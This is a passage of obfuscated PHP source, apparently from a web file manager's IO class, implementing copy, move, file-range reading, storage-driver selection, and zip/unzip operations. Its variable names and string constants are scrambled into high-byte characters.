$üó«ì²Ü, $†Âàµ²ù, &$ìİù‰ğè) { $ÀåØÔê… =& $_SERVER[¦»×‡Ãã]; if (self::driverIsSame($îÛá•Ãá, $†Âàµ²ù) && $îÛá•Ãá->isFolder($üó«ì²Ü) && $îÛá•Ãá->isParentOf($üó«ì²Ü, $ìİù‰ğè)) { show_json(LNG($ÀåØÔê…[1235]), !1); } if (!$îÛá•Ãá->exist($üó«ì²Ü)) { show_json(LNG($ÀåØÔê…[108]), !1); } } private static function copyPath($ÖĞ¹Â¡’, $­Ëú¦ñ¢, $¡ÔıÜÜ, $¢„ÎÜÀÏ, $Û…•Ç†š, $ÌÅ‰å­­, $’¦û†¹§, $åÔ°·Õ = false, $•ß¬á¬ = true) { $®êğıú =& $_SERVER[¦»×‡Ãã]; $æÔÏ‹íº = empty($åÔ°·Õ) && $åÔ°·Õ !== $®êğıú[228] ? $ÖĞ¹Â¡’->pathThis($­Ëú¦ñ¢) : $åÔ°·Õ; if ($Û…•Ç†š) { $‡Ì¨¯Å = $¡ÔıÜÜ->fileNameExist($¢„ÎÜÀÏ, $æÔÏ‹íº); $½™±­©¡ = $æÔÏ‹íº; $æÔÏ‹íº = $¡ÔıÜÜ->fileNameAuto($¢„ÎÜÀÏ, $æÔÏ‹íº, $Û…•Ç†š, !$’¦û†¹§); if (!$‡Ì¨¯Å || $½™±­©¡ != $æÔÏ‹íº) { $Û…•Ç†š = !1; } if ($•ß¬á¬ && !$Û…•Ç†š) { $¡ÔıÜÜ->_data[$®êğıú[1236]] = !0; } } if ($’¦û†¹§) { return self::copyFile($ÖĞ¹Â¡’, $­Ëú¦ñ¢, $¡ÔıÜÜ, $¢„ÎÜÀÏ, $æÔÏ‹íº, $ÌÅ‰å­­); } if ($Û…•Ç†š == REPEAT_RENAME_FOLDER) { $Û…•Ç†š = !1; } $¾à•ëİ° = rtrim($¢„ÎÜÀÏ, $®êğıú[8]) . $®êğıú[8] . $æÔÏ‹íº; $Šó´£« = $¡ÔıÜÜ->mkdir($¡ÔıÜÜ->getPath($¾à•ëİ°), $Û…•Ç†š); $¢„ÎÜÀÏ = $¡ÔıÜÜ->getPathInner($Šó´£«); $Ğã§Şö = $ÖĞ¹Â¡’->listPath($­Ëú¦ñ¢, !0); $Ğã§Şö = is_array($Ğã§Şö) ? $Ğã§Şö : array($®êğıú[86] => array(), $®êğıú[85] => array()); $œÌ¥åÄ˜ = array_merge($Ğã§Şö[$®êğıú[86]], $Ğã§Şö[$®êğıú[85]]); foreach ($œÌ¥åÄ˜ as $›’¥©€Û) { $™ì¸¤Òç = $›’¥©€Û[$®êğıú[33]] == $®êğıú[230]; $­Ëú¦ñ¢ = $ÖĞ¹Â¡’->getPathInner($›’¥©€Û[$®êğıú[87]]); $Àù‡İå = self::copyPath($ÖĞ¹Â¡’, $­Ëú¦ñ¢, $¡ÔıÜÜ, $¢„ÎÜÀÏ, $Û…•Ç†š, $ÌÅ‰å­­, $™ì¸¤Òç, !1, !1); if (!$Àù‡İå) { IO::errorTips($®êğıú[1237] . $­Ëú¦ñ¢ . $®êğıú[73] . $¢„ÎÜÀÏ); } } self::copyMoveKeepInfo($ÖĞ¹Â¡’, $­Ëú¦ñ¢, $Šó´£«); return $Šó´£«; } private static function copyFile($î‡ØŞ›á, $–³”ñø´, $ñşıùü­, $áÇ¶Ûî›, $˜™€Ğñ‚, $÷è¼˜Ë) { $ÔŞŠ›ğ¿ =& $_SERVER[¦»×‡Ãã]; $áÇ¶Ûî› = $ñşıùü­->getPath(rtrim($áÇ¶Ûî›, $ÔŞŠ›ğ¿[8]) . $ÔŞŠ›ğ¿[8] . $˜™€Ğñ‚); $°¯äÛèÇ = $ÔŞŠ›ğ¿[1238] . time() . rand_string(5); Hook::trigger($ÔŞŠ›ğ¿[1239], $î‡ØŞ›á, $–³”ñø´, $ñşıùü­, $áÇ¶Ûî›, $˜™€Ğñ‚, $°¯äÛèÇ); if (self::driverIsSame($î‡ØŞ›á, $ñşıùü­)) { if ($÷è¼˜Ë) { $ããñï¸À = $ñşıùü­->moveFile($–³”ñø´, $áÇ¶Ûî›); } else { $ããñï¸À = $ñşıùü­->copyFile($–³”ñø´, $áÇ¶Ûî›); } Hook::trigger($ÔŞŠ›ğ¿[1240], $î‡ØŞ›á, $–³”ñø´, $ñşıùü­, $áÇ¶Ûî›, $˜™€Ğñ‚, $ããñï¸À); self::copyMoveKeepInfo($î‡ØŞ›á, $–³”ñø´, $ããñï¸À); return $ããñï¸À; } $óÒ¹›±ö = TEMP_FILES; if ($GLOBALS[$ÔŞŠ›ğ¿[6]][$ÔŞŠ›ğ¿[92]][$ÔŞŠ›ğ¿[869]]) { $óÒ¹›±ö = $GLOBALS[$ÔŞŠ›ğ¿[6]][$ÔŞŠ›ğ¿[92]][$ÔŞŠ›ğ¿[869]]; } $öŒ¬ûƒ² = $óÒ¹›±ö; mk_dir($öŒ¬ûƒ²); $â¹öíÄİ = $öŒ¬ûƒ² . $°¯äÛèÇ; $‘¾Ó‰” = $â¹öíÄİ; $â¹öíÄİ = $î‡ØŞ›á->download($–³”ñø´, $â¹öíÄİ); $â¹öíÄİ = $î‡ØŞ›á->iconvApp($â¹öíÄİ); if (substr($â¹öíÄİ, strlen($óÒ¹›±ö)) == $óÒ¹›±ö) { $÷è¼˜Ë = !0; } $ããñï¸À = $ñşıùü­->upload($áÇ¶Ûî›, $â¹öíÄİ, $÷è¼˜Ë); self::remove($‘¾Ó‰”); Hook::trigger($ÔŞŠ›ğ¿[1240], $î‡ØŞ›á, $–³”ñø´, $ñşıùü­, $áÇ¶Ûî›, $˜™€Ğñ‚, $ããñï¸À); self::copyMoveKeepInfo($î‡ØŞ›á, $–³”ñø´, $ããñï¸À); return $ããñï¸À; } private static function copyMoveKeepInfo($º¤ÃŸÈ, $ŸÎù¸ô, $ş÷İøÏè) { if (!$ş÷İøÏè) { return; } $æãú×Ï = $º¤ÃŸÈ->info($ŸÎù¸ô); if (!is_array($æãú×Ï)) { return; } IO::setModifyTime($ş÷İøÏè, $æãú×Ï[$_SERVER[¦»×‡Ãã][88]]); } public static function pathFather($Ìë åÉ©) { $İ©Í­øà = IO::init($Ìë åÉ©); $Ï€š÷Ãó = $İ©Í­øà->pathFather($İ©Í­øà->path); return $İ©Í­øà->getPathOuter($Ï€š÷Ãó); } public static function fileOut($š–å‰öÃ, $Æì±Ò‡í = false, $õı‹Şà» = false, $Ô‘é’ş = '') { $ø‘ÒÓš = self::driverMake($š–å‰öÃ); if ($ø‘ÒÓš->isFileOutServer()) { return $ø‘ÒÓš->fileOutServer($š–å‰öÃ, $Æì±Ò‡í, $õı‹Şà», $Ô‘é’ş); } return $ø‘ÒÓš->fileOut($š–å‰öÃ, $Æì±Ò‡í, $õı‹Şà», $Ô‘é’ş); } public static function fileOutImage($Ñı÷–‘Û, $ü˜¦¥¾Ä = 250) { $½ªÁò¼å = array(250, 600, 1200, 2000, 3000, 5000); for ($áøº½† = 0; $áøº½† < count($½ªÁò¼å); $áøº½†++) { if ($áøº½† == 0 && $ü˜¦¥¾Ä <= $½ªÁò¼å[$áøº½†]) { $ü˜¦¥¾Ä = $½ªÁò¼å[$áøº½†]; break; } else { if ($ü˜¦¥¾Ä > $½ªÁò¼å[$áøº½† - 1] && $ü˜¦¥¾Ä <= $½ªÁò¼å[$áøº½†]) { $ü˜¦¥¾Ä = $½ªÁò¼å[$áøº½†]; break; } else { if ($áøº½† == count($½ªÁò¼å) - 1 && $ü˜¦¥¾Ä > $½ªÁò¼å[$áøº½†]) { $ü˜¦¥¾Ä = $½ªÁò¼å[$áøº½†]; break; } } } } $Ïû‡È’Ü = self::driverMake($Ñı÷–‘Û); if ($Ïû‡È’Ü->isFileOutServer()) { return $Ïû‡È’Ü->fileOutImageServer($Ñı÷–‘Û, $ü˜¦¥¾Ä); } return $Ïû‡È’Ü->fileOutImage($Ñı÷–‘Û, $ü˜¦¥¾Ä); } private static function driverIsSame($Êª¬´Šá, $èŞ¦áãÇ) { $ë î½Ü‚ =& $_SERVER[¦»×‡Ãã]; $»ãº½îÀ = $Êª¬´Šá->getType(); $–¢¸²ã = $èŞ¦áãÇ->getType(); if ($»ãº½îÀ != $–¢¸²ã) { return !1; } if ($»ãº½îÀ == $ë î½Ü‚[830]) { return !0; } if ($»ãº½îÀ == $ë î½Ü‚[109]) { return !0; } if ($Êª¬´Šá->pathDriver == $èŞ¦áãÇ->pathDriver) { return !0; } return !1; } public static function copyUpdate($¡»í©Ù¨, $Úå²¢…ï) { $ËÖÀŒÙ  =& $_SERVER[¦»×‡Ãã]; if (!IO::exist($¡»í©Ù¨)) { return !1; } if (!IO::exist($Úå²¢…ï)) { IO::mkdir($Úå²¢…ï); } $™§¨Ô“… = array_to_keyvalue(self::listAllSimple($¡»í©Ù¨), $ËÖÀŒÙ [87]); $§äÙ…Íô = array_to_keyvalue(self::listAllSimple($Úå²¢…ï), $ËÖÀŒÙ [87]); $•¯â‚ = array(); $Š¬Ğ¶Ïé = array(); foreach ($™§¨Ô“… as $ãæ™‡ŸŸ => $å¸È¾ü) { if (isset($§äÙ…Íô[$ãæ™‡ŸŸ])) { if ($å¸È¾ü[$ËÖÀŒÙ [78]] == 1) { continue; } if ($§äÙ…Íô[$ãæ™‡ŸŸ][$ËÖÀŒÙ [79]] == $å¸È¾ü[$ËÖÀŒÙ [79]]) { continue; } } if ($å¸È¾ü[$ËÖÀŒÙ [78]] == 1) { $Š¬Ğ¶Ïé[] = $Úå²¢…ï . $ËÖÀŒÙ [8] . trim($ãæ™‡ŸŸ, $ËÖÀŒÙ [8]); continue; } $Äò´½Ù½ = strstr(trim($ãæ™‡ŸŸ, $ËÖÀŒÙ [8]), $ËÖÀŒÙ [8]) ? get_path_father($ãæ™‡ŸŸ) : $ËÖÀŒÙ [12]; $•¯â‚[] = array($ËÖÀŒÙ [1241] => $å¸È¾ü[$ËÖÀŒÙ [89]], $ËÖÀŒÙ [1242] => rtrim($Úå²¢…ï, $ËÖÀŒÙ [8]) . $ËÖÀŒÙ [8] . $Äò´½Ù½, $ËÖÀŒÙ [1243] => $å¸È¾ü); } $·–©ÂÚê = array($ËÖÀŒÙ [230] => $•¯â‚, $ËÖÀŒÙ [78] => $Š¬Ğ¶Ïé); Hook::trigger($ËÖÀŒÙ [1244], $¡»í©Ù¨, $Úå²¢…ï, $·–©ÂÚê); foreach ($Š¬Ğ¶Ïé as $å¸È¾ü) { IO::mkdir($å¸È¾ü); } foreach ($•¯â‚ as $å¸È¾ü) { IO::copy($å¸È¾ü[$ËÖÀŒÙ [1241]], $å¸È¾ü[$ËÖÀŒÙ [1242]], REPEAT_REPLACE); } } public static function fileSubstr($°„­şÂ‰, $½°­°Û“, $£ÎÜÌş½ = false) { $ÍÎ€©ó– =& $_SERVER[¦»×‡Ãã]; $¶Ä·Šˆ = self::driverMake($°„­şÂ‰); $Æî‘©è“ = $¶Ä·Šˆ->size($°„­şÂ‰); $Ó ±Ôã§ = $½°­°Û“; $Éˆ†Ä‡î = $£ÎÜÌş½; if ($½°­°Û“ < 0) { $½°­°Û“ = $Æî‘©è“ + $½°­°Û“; } if ($£ÎÜÌş½ === !1) { $£ÎÜÌş½ = $Æî‘©è“ - $½°­°Û“; } if ($½°­°Û“ + $£ÎÜÌş½ > $Æî‘©è“) { $£ÎÜÌş½ = $Æî‘©è“ - $½°­°Û“; } if (!$Æî‘©è“ && $¶Ä·Šˆ->getType() == $ÍÎ€©ó–[109] && !$¶Ä·Šˆ->exist($°„­şÂ‰)) { $Ä£–Á = get_path_this($°„­şÂ‰); $ú×›üÆØ = parse_url_query($Ä£–Á); if (is_array($ú×›üÆØ) && isset($ú×›üÆØ[$ÍÎ€©ó–[32]])) { $Ä£–Á = urldecode($ú×›üÆØ[$ÍÎ€©ó–[32]]); } throw new Exception($ÍÎ€©ó–[1245] . LNG($ÍÎ€©ó–[1246]) . $ÍÎ€©ó–[1044] . clear_html($Ä£–Á) . $ÍÎ€©ó–[12]); } if ($£ÎÜÌş½ <= 0) { return $ÍÎ€©ó–[12]; } if ($½°­°Û“ < 0 || $½°­°Û“ >= $Æî‘©è“ || $£ÎÜÌş½ > 1024 * 1024 * 10) { throw new Exception("\146\151\x6c\145\122\145\141\144\40\145\x72\x72\157\162\41\x20\163\x74\x61\x72\x74\x3d{$½°­°Û“}\x3b\154\x65\156\147\x74\150\75{$£ÎÜÌş½}\x3b\x20\163\x69\x7a\x65\x3d{$Æî‘©è“}\x3b"); } $•˜Ô—­‚ = $¶Ä·Šˆ->fileSubstr($°„­şÂ‰, $½°­°Û“, $£ÎÜÌş½); if (!$•˜Ô—­‚ && $£ÎÜÌş½ && isset($GLOBALS[$ÍÎ€©ó–[1247]])) { throw new Exception($GLOBALS[$ÍÎ€©ó–[1247]][$ÍÎ€©ó–[1248]]); } return $•˜Ô—­‚; } private static function driverMake(&$«Î¶ã‚Ï) { $â¶§Äæ® =& $_SERVER[¦»×‡Ãã]; $ôŠìÍ¨é = KodIO::parse($«Î¶ã‚Ï); if (!self::$driverListSystem) { $¨¾ÙéÒú = Model($â¶§Äæ®[840])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($¨¾ÙéÒú, $â¶§Äæ®[475]); } if ($ôŠìÍ¨é[$â¶§Äæ®[33]] == KodIO::KOD_IO && !self::$driverListSystem[$ôŠìÍ¨é[$â¶§Äæ®[475]]]) { throw new Exception($â¶§Äæ®[1249]); return !1; } $«Î¶ã‚Ï = $ôŠìÍ¨é[$â¶§Äæ®[1250]]; $Ò¼è‘§î = self::driverGet($ôŠìÍ¨é, $«Î¶ã‚Ï); return $Ò¼è‘§î; } private static function driverGet($Øâèßˆ, &$ıü±ü±¤) { $ÑÙ©¿ïˆ =& $_SERVER[¦»×‡Ãã]; $¥ïÈĞ£ = $Øâèßˆ[$ÑÙ©¿ïˆ[1251]]; $ãŸ²ê‰© = $Øâèßˆ[$ÑÙ©¿ïˆ[475]]; switch ($Øâèßˆ[$ÑÙ©¿ïˆ[33]]) { case KodIO::KOD_IO: $åã»§– = self::$driverListSystem[$ãŸ²ê‰©]; break; case KodIO::KOD_SOURCE: $ıü±ü±¤ = $ãŸ²ê‰© . $ıü±ü±¤; $åã»§– = array($ÑÙ©¿ïˆ[1252] => $ÑÙ©¿ïˆ[1253], $ÑÙ©¿ïˆ[6] => $Øâèßˆ); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $¶¸Í Æ™ = $GLOBALS[$ÑÙ©¿ïˆ[1254]]; self::$driverListUser = array_to_keyvalue($¶¸Í Æ™, $ÑÙ©¿ïˆ[475]); } $åã»§– = self::$driverListUser[$ãŸ²ê‰©]; break; case KodIO::KOD_SHARE_LINK: $åã»§– = array($ÑÙ©¿ïˆ[1252] => $ÑÙ©¿ïˆ[1255], $ÑÙ©¿ïˆ[6] => $Øâèßˆ); $Àç‚¬ñ” = Action($ÑÙ©¿ïˆ[1256])->sharePathInfo($Øâèßˆ[$ÑÙ©¿ïˆ[87]]); $ıü±ü±¤ = $Àç‚¬ñ”[$ÑÙ©¿ïˆ[193]]; if (!$Àç‚¬ñ”[$ÑÙ©¿ïˆ[193]]) { $×ò½–ØŠ = Model($ÑÙ©¿ïˆ[664])->getInfo($Àç‚¬ñ”[$ÑÙ©¿ïˆ[665]]); $ıü±ü±¤ = KodIO::clear($×ò½–ØŠ[$ÑÙ©¿ïˆ[1257]] . $Øâèßˆ[$ÑÙ©¿ïˆ[1250]]); $Øâèßˆ[$ÑÙ©¿ïˆ[560]] = $×ò½–ØŠ; $Øâèßˆ[$ÑÙ©¿ïˆ[1232]] = $ıü±ü±¤; $åã»§– = array($ÑÙ©¿ïˆ[1252] => $ÑÙ©¿ïˆ[1258], $ÑÙ©¿ïˆ[6] => $Øâèßˆ); } break; case KodIO::KOD_SHARE_ITEM: $åã»§– = array($ÑÙ©¿ïˆ[1252] => $ÑÙ©¿ïˆ[1259], $ÑÙ©¿ïˆ[6] => $Øâèßˆ); $×ò½–ØŠ = Model($ÑÙ©¿ïˆ[664])->getInfo($Øâèßˆ[$ÑÙ©¿ïˆ[475]]); if ($×ò½–ØŠ[$ÑÙ©¿ïˆ[193]] == $ÑÙ©¿ïˆ[228]) { $ıü±ü±¤ = KodIO::clear($×ò½–ØŠ[$ÑÙ©¿ïˆ[1257]] . $Øâèßˆ[$ÑÙ©¿ïˆ[1250]]); $Øâèßˆ[$ÑÙ©¿ïˆ[560]] = $×ò½–ØŠ; $Øâèßˆ[$ÑÙ©¿ïˆ[1232]] = $ıü±ü±¤; $åã»§– = array($ÑÙ©¿ïˆ[1252] => $ÑÙ©¿ïˆ[1260], $ÑÙ©¿ïˆ[6] => $Øâèßˆ); } else { if (!$ıü±ü±¤) { $ıü±ü±¤ = $×ò½–ØŠ[$ÑÙ©¿ïˆ[193]]; } } break; default: $ıü±ü±¤ = $Øâèßˆ[$ÑÙ©¿ïˆ[87]]; $åã»§– = array($ÑÙ©¿ïˆ[1252] => $ÑÙ©¿ïˆ[1261]); break; } $ìø‘å•Î = $Øâèßˆ[$ÑÙ©¿ïˆ[87]]; if (!isset(self::$driverCache[$ìø‘å•Î])) { $ôÇíº = strtolower($åã»§–[$ÑÙ©¿ïˆ[98]]); $ôæšú•• = $GLOBALS[$ÑÙ©¿ïˆ[6]][$ÑÙ©¿ïˆ[92]][$ÑÙ©¿ïˆ[898]]; $ÊÕÍ£“Å = $ÑÙ©¿ïˆ[77] . (isset($ôæšú••[$ôÇíº]) ? $ôæšú••[$ôÇíº] : ucfirst($ôÇíº)); if (!class_exists($ÊÕÍ£“Å)) { show_json("{$ÊÕÍ£“Å}\40\156\x6f\x74\x20\145\x78\x69\x73\164\163\x21", !1); } $İÖşùÓ  = isset($åã»§–[$ÑÙ©¿ïˆ[6]]) ? $åã»§–[$ÑÙ©¿ïˆ[6]] : !1; self::$driverCache[$ìø‘å•Î] = new $ÊÕÍ£“Å($İÖşùÓ ); } $ìıÄîãŞ = self::$driverCache[$ìø‘å•Î]; $ìıÄîãŞ->pathDriver = $¥ïÈĞ£; $ìıÄîãŞ->pathBase = $ÑÙ©¿ïˆ[12]; if (isset($åã»§–[$ÑÙ©¿ïˆ[6]][$ÑÙ©¿ïˆ[1262]])) { $ìıÄîãŞ->pathBase = rtrim($åã»§–[$ÑÙ©¿ïˆ[6]][$ÑÙ©¿ïˆ[1262]], $ÑÙ©¿ïˆ[8]) . $ÑÙ©¿ïˆ[8]; $ıü±ü±¤ = $ìıÄîãŞ->pathBase . ltrim($ıü±ü±¤, $ÑÙ©¿ïˆ[8]); } $ıü±ü±¤ = $ìıÄîãŞ->getPath($ıü±ü±¤); if (isset($Øâèßˆ[$ÑÙ©¿ïˆ[1232]])) { $ıü±ü±¤ = $Øâèßˆ[$ÑÙ©¿ïˆ[1232]]; } $ìıÄîãŞ->path = $ıü±ü±¤; return $ìıÄîãŞ; } public static function errorTips($ È÷™›Å = false) { $¹İèñ¡¦ =& $_SERVER[¦»×‡Ãã]; static $‰ÓÇ‰çÜ = array(); $Èˆò½ˆ¸ = 1000; if ($ È÷™›Å === -1) { return $‰ÓÇ‰çÜ ? $‰ÓÇ‰çÜ[count($‰ÓÇ‰çÜ) - 1] : $¹İèñ¡¦[12]; } if ($ È÷™›Å === !1) { return implode($¹İèñ¡¦[262], $‰ÓÇ‰çÜ); } if (count($‰ÓÇ‰çÜ) >= $Èˆò½ˆ¸) { $‰ÓÇ‰çÜ = array_slice($‰ÓÇ‰çÜ, $Èˆò½ˆ¸ * 0.5, $Èˆò½ˆ¸); } $‰ÓÇ‰çÜ[] = $ È÷™›Å; write_log($¹İèñ¡¦[176] . ACTION . $¹İèñ¡¦[1263] . $ È÷™›Å, $¹İèñ¡¦[1264]); } public static function getLastError($ÅŠ‡Úà‘ = '') { $Ó”ñöı = self::errorTips(-1); return $Ó”ñöı ? $Ó”ñöı : $ÅŠ‡Úà‘; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $³œãĞšá; if ($³œãĞšá) { return $³œãĞšá; } $Ê®ß›òì = IO::init($_SERVER[¦»×‡Ãã][8]); return $Ê®ß›òì; } private static function iconvSystem($÷âŸ£üÍ) { return self::local()->iconvSystem($÷âŸ£üÍ); } private static function iconvApp($—ğ÷ºíÆ) { return self::local()->iconvApp($—ğ÷ºíÆ); } public static function zipFolder($˜³û€€Ò, $›Ñ¥Ô’Ë = "\172\151\160", $õÏû•´Â = '', $Êàíœôá = REPEAT_RENAME) { $ãÛãó¥ö =& $_SERVER[¦»×‡Ãã]; $Ê’³“²ã = IO::listPath($˜³û€€Ò); if (!$Ê’³“²ã) { return !1; } $Ê’³“²ã = array_merge($Ê’³“²ã[$ãÛãó¥ö[85]], $Ê’³“²ã[$ãÛãó¥ö[86]]); return self::zip($Ê’³“²ã, $›Ñ¥Ô’Ë, $õÏû•´Â, $Êàíœôá); } public static function zip($¨Ã¼—ò´, $°›á¢€‰ = "\x7a\x69\x70", $¥Ô˜°Ê = '', $•¯ªñ­‹ = REPEAT_RENAME) { $ê·ËŞò¹ =& $_SERVER[¦»×‡Ãã]; if (is_string($¨Ã¼—ò´) && $¨Ã¼—ò´) { $¨Ã¼—ò´ = array(array($ê·ËŞò¹[87] => $¨Ã¼—ò´)); } $à®°ÑÛÚ = self::init($¨Ã¼—ò´[0][$ê·ËŞò¹[87]]); $ÆâÏï† = self::info($¨Ã¼—ò´[0][$ê·ËŞò¹[87]]); $¬Í¬®ùÈ = $ê·ËŞò¹[12]; $‡°àÇÀš = $ê·ËŞò¹[12]; $ƒå¢›ù‡ = $ê·ËŞò¹[12]; if ($¥Ô˜°Ê && substr($¥Ô˜°Ê, -1, 1) != $ê·ËŞò¹[8]) { $‡°àÇÀš = get_path_father($¥Ô˜°Ê); $ƒå¢›ù‡ = get_path_this($¥Ô˜°Ê); } else { $‡°àÇÀš = self::pathFather($ÆâÏï†[$ê·ËŞò¹[87]]); $ƒå¢›ù‡ = $ÆâÏï†[$ê·ËŞò¹[32]] . $ê·ËŞò¹[10] . $°›á¢€‰; if (count($¨Ã¼—ò´) > 1) { $Úƒİ¢Ù² = IO::info($‡°àÇÀš); $ƒå¢›ù‡ = $Úƒİ¢Ù²[$ê·ËŞò¹[32]] . $ê·ËŞò¹[10] . $°›á¢€‰; } if ($¥Ô˜°Ê) { $‡°àÇÀš = $¥Ô˜°Ê; } } if ($à®°ÑÛÚ->getType() == $ê·ËŞò¹[109]) { $Â¹¶½»Ã = self::init($‡°àÇÀš); $š½Ğ‚¹ = $Â¹¶½»Ã->getType() == $ê·ËŞò¹[109] ? $‡°àÇÀš : get_path_father($à®°ÑÛÚ->path); $š½Ğ‚¹ = rtrim($š½Ğ‚¹, $ê·ËŞò¹[8]) . $ê·ËŞò¹[8]; mk_dir($š½Ğ‚¹); } else { $¬Í¬®ùÈ = TEMP_FILES . $ê·ËŞò¹[1265] . time() . rand_string(8) . $ê·ËŞò¹[8]; mk_dir($¬Í¬®ùÈ); file_put_contents($¬Í¬®ùÈ . $ê·ËŞò¹[1266], $ê·ËŞò¹[12]); $š½Ğ‚¹ = $¬Í¬®ùÈ; } $½ˆÆÉ‡ = IO::info($š½Ğ‚¹); if (!$½ˆÆÉ‡ || !$½ˆÆÉ‡[$ê·ËŞò¹[233]]) { show_json(LNG($ê·ËŞò¹[1267]), !1); } $¬®Ó…è“ = self::zipFileList($¨Ã¼—ò´, $¬Í¬®ùÈ); foreach ($¬®Ó…è“ as $—óÊçÎ => $âæñòèÛ) { $¬®Ó…è“[$—óÊçÎ] = self::iconvSystem($âæñòèÛ); } $ü§ó»‚ = get_filename_auto($š½Ğ‚¹ . $ƒå¢›ù‡, $ê·ËŞò¹[12], $•¯ªñ­‹); KodArchive::create(self::iconvSystem($ü§ó»‚), $¬®Ó…è“); if (!IO::exist($ü§ó»‚)) { if ($¬Í¬®ùÈ) { del_dir($¬Í¬®ùÈ); } write_log($ê·ËŞò¹[1268] . $ü§ó»‚, $ê·ËŞò¹[389]); show_json(LNG($ê·ËŞò¹[1269]), !1); } if (!$¬Í¬®ùÈ) { return $ü§ó»‚; } $–ìÜ°› = self::move($ü§ó»‚, $‡°àÇÀš, $•¯ªñ­‹); if ($¬Í¬®ùÈ) { del_dir($¬Í¬®ùÈ); } if (!$ü§ó»‚) { write_log($ê·ËŞò¹[1270] . $ü§ó»‚ . $ê·ËŞò¹[1271] . $‡°àÇÀš, $ê·ËŞò¹[389]); show_json(LNG($ê·ËŞò¹[1269]), !1); } return $–ìÜ°›; } public static function unzip($¡’Ñ®ç, $ôÊ”Ô™À, $ ° ò¿ı = "\x2d\x31", $õ‚Ë ­ä = "\x72\x65\160\x6c\x61\143\145") { $°ŒéÍîù =& $_SERVER[¦»×‡Ãã]; $Ò àìñá = parent::info($¡’Ñ®ç); if (!$Ò àìñá) { show_json(LNG($°ŒéÍîù[1272]), !1); } $Æ¤èà–Ê = IO::infoFullSimple($ôÊ”Ô™À); if (!$Æ¤èà–Ê) { $ôÊ”Ô™À = IO::mkdir($ôÊ”Ô™À); } if (isset($Æ¤èà–Ê[$°ŒéÍîù[193]]) && trim($Æ¤èà–Ê[$°ŒéÍîù[87]], $°ŒéÍîù[8]) != trim($ôÊ”Ô™À, $°ŒéÍîù[8])) { $”‹àÁçÕ = KodIO::make($Æ¤èà–Ê[$°ŒéÍîù[192]]); $Èò€€§é = IO::fileNameAuto($”‹àÁçÕ, $Æ¤èà–Ê[$°ŒéÍîù[32]], REPEAT_RENAME_FOLDER, !0); $ôÊ”Ô™À = IO::mkdir($”‹àÁçÕ . $Èò€€§é); } $ ° ò¿ı = $ ° ò¿ı && $ ° ò¿ı != $°ŒéÍîù[1273] ? @json_decode($ ° ò¿ı, !0) : -1; $ê¾ËÜû­ = self::unzipPart($¡’Ñ®ç, $ ° ò¿ı); if (!$ê¾ËÜû­ || !IO::exist($ê¾ËÜû­[$°ŒéÍîù[230]])) { show_json(LNG($°ŒéÍîù[108]), !1); } $°ÉÔ Şş = $ê¾ËÜû­[$°ŒéÍîù[1274]][count($ê¾ËÜû­[$°ŒéÍîù[1274]]) - 1]; if ($°ÉÔ Şş[$°ŒéÍîù[1275]] == -1 || substr($°ÉÔ Şş[$°ŒéÍîù[32]], -1, 1) == $°ŒéÍîù[8]) { $åÂûúÑ = $ê¾ËÜû­[$°ŒéÍîù[1276]] . rand_string(10) . $°ŒéÍîù[8]; mk_dir($åÂûúÑ); $ãßøÆ÷é = count($ê¾ËÜû­[$°ŒéÍîù[1274]]) == 1 ? IO::ext($¡’Ñ®ç) : get_path_ext($ê¾ËÜû­[$°ŒéÍîù[230]]); $±¤ÔÈ¢ä = KodArchive::extract(self::iconvSystem($ê¾ËÜû­[$°ŒéÍîù[230]]), $åÂûúÑ, $°ÉÔ Şş[$°ŒéÍîù[1275]], $Èò€€§é, $ãßøÆ÷é); self::unzipErrorCheck($±¤ÔÈ¢ä, array($°ŒéÍîù[1277], $¡’Ñ®ç, $ãßøÆ÷é, $ôÊ”Ô™À, $ê¾ËÜû­)); Hook::trigger($°ŒéÍîù[1278], $åÂûúÑ); recursion_dir($åÂûúÑ, $‘ñåø×¼, $Ô‹ôê‰Ò, 0); $ˆ¯Ô¶Ö = array_merge($‘ñåø×¼, $Ô‹ôê‰Ò); $Ï¥®ø’ = array(); foreach ($ˆ¯Ô¶Ö as $€İÂ®Ğ¶) { $øÆ‚ì³ = IO::move(self::iconvApp($€İÂ®Ğ¶), $ôÊ”Ô™À, $õ‚Ë ­ä); if ($øÆ‚ì³) { $Ï¥®ø’[] = $øÆ‚ì³; } } del_dir($åÂûúÑ); } else { $øÆ‚ì³ = IO::move($ê¾ËÜû­[$°ŒéÍîù[230]], $ôÊ”Ô™À, $õ‚Ë ­ä, get_path_this($°ÉÔ Şş[$°ŒéÍîù[32]])); if ($øÆ‚ì³) { $Ï¥®ø’[] = $øÆ‚ì³; } } return $Ï¥®ø’ ? $Ï¥®ø’ : !1; } public static function unzipList($üúØ‹·¾) { $ÌÚØ½Ä„ =& $_SERVER[¦»×‡Ãã]; $Õš¬†¶Ÿ = isset($üúØ‹·¾[$ÌÚØ½Ä„[1279]]) ? $üúØ‹·¾[$ÌÚØ½Ä„[1279]] : !1; $åõ÷Îàè = isset($üúØ‹·¾[$ÌÚØ½Ä„[1275]]) ? @json_decode($üúØ‹·¾[$ÌÚØ½Ä„[1275]], !0) : -1; $ğéïèëÑ = self::unzipPart($üúØ‹·¾[$ÌÚØ½Ä„[87]], $åõ÷Îàè); if (!$ğéïèëÑ || !IO::exist($ğéïèëÑ[$ÌÚØ½Ä„[230]])) { show_json(LNG($ÌÚØ½Ä„[108]), !1); } $õâÙ­˜ƒ = $ğéïèëÑ[$ÌÚØ½Ä„[1274]][count($ğéïèëÑ[$ÌÚØ½Ä„[1274]]) - 1]; $”‘ıéŠ§ = in_array(IO::ext($ğéïèëÑ[$ÌÚØ½Ä„[230]]), array($ÌÚØ½Ä„[389], $ÌÚØ½Ä„[1280], $ÌÚØ½Ä„[1281], $ÌÚØ½Ä„[1282], $ÌÚØ½Ä„[1283], $ÌÚØ½Ä„[1284])); if (!$Õš¬†¶Ÿ && ($õâÙ­˜ƒ[$ÌÚØ½Ä„[1275]] == -1 || $”‘ıéŠ§)) { $¹ğª¼»õ = $ğéïèëÑ[$ÌÚØ½Ä„[1276]] . get_path_this($ğéïèëÑ[$ÌÚØ½Ä„[230]]) . $ÌÚØ½Ä„[1285]; if (!IO::exist($¹ğª¼»õ)) { $ÛˆÀâûÇ = $õâÙ­˜ƒ[$ÌÚØ½Ä„[1275]] == -1 ? get_path_ext(IO::pathThis($üúØ‹·¾[$ÌÚØ½Ä„[87]])) : 